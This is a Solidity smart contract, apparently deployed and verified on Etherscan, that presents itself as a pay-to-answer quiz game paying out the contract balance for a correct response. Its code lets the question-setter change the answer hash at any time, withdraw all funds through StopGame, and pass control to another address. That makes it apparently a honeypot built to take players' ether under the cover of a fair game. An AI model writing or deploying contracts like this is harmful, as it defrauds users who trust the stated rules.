/**

 *Submitted for verification at Etherscan.io on 2019-03-29

*/



pragma solidity ^0.4.25;



contract play_with_me

{



    function Try(string _response) external payable {

        require(msg.sender == tx.origin);



        if(responseHash == keccak256(_response) && msg.value > 2 ether)

        {

            msg.sender.transfer(this.balance);

        }

    }



    string public question;



    address questionSender;



    bytes32 responseHash;



    bytes32 questionerPin = 0x333d943fb1009e22bb1232094bfc2d99765786d0bb471d06b5353adb936391cf;



    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {

        if(keccak256(_questionerPin)==questionerPin) 

        {

            responseHash = keccak256(_response);

            question = _question;

            questionSender = msg.sender;

            questionerPin = 0x0;

        }

    }



    function StopGame() public payable {

        require(msg.sender==questionSender);

        msg.sender.transfer(this.balance);

    }



    function NewQuestion(string _question, bytes32 _responseHash) public payable {

        if(msg.sender==questionSender){

            question = _question;

            responseHash = _responseHash;

        }

    }



    function newQuestioner(address newAddress) public {

        if(msg.sender==questionSender)questionSender = newAddress;

    }



    function() public payable{}

}